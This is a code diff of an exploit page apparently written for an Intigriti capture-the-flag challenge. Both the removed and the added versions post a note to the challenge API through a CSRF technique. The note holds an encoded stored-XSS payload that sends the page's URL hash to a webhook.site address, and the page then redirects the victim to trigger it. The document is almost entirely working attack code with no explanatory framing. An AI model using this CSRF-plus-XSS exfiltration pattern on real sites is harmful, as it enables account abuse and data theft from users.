@@ -1,31 +1,24 @@
-<html>
-  <body>
+<body>
     <script>
-      // Step 1: Create the note using form-based CSRF
-      const form = document.createElement('form');
-      form.action = 'https://challenge-0325.intigriti.io/api/post';
-      form.method = 'POST';
-      form.enctype = 'text/plain'; // Bypass CORS preflight
-
-      // Craft the JSON payload
-      const payload = JSON.stringify({
-        title: 'Leaky Flag',
-        content: '&#x3C;img src=x onerror="fetch(\\'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=\\' + document.location.hash.substr(3))" /&#x3E;',
-        use_password: 'false'
-      });
-
-      // Inject payload into the form
-      const input = document.createElement('input');
-      input.name = `_${payload}`; // Trick the server into parsing JSON
-      form.appendChild(input);
-
-      document.body.appendChild(form);
-      form.submit();
-
-      // Step 2: Redirect to /notes after a delay
-      setTimeout(() => {
+      // Step 1: Create the note via POST with JSON
+      fetch('https://challenge-0325.intigriti.io/api/post', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          title: 'Leaky Flag',
+          content: '&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;fetch("https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=" + encodeURIComponent(document.location.hash))&#x3C;/script&#x3E;',
+          use_password: 'false'
+        }),
+        credentials: 'include', // Include session cookies
+        mode: 'no-cors' // Bypass CORS errors (opaque response)
+      })
+      .then(() => {
+        // Step 2: Redirect to /notes to trigger the XSS
         window.location.href = 'https://challenge-0325.intigriti.io/notes';
-      }, 2000); // Ensure note creation completes
+      })
+      .catch(err => console.error('Error:', err));
     </script>
   </body>
 </html>
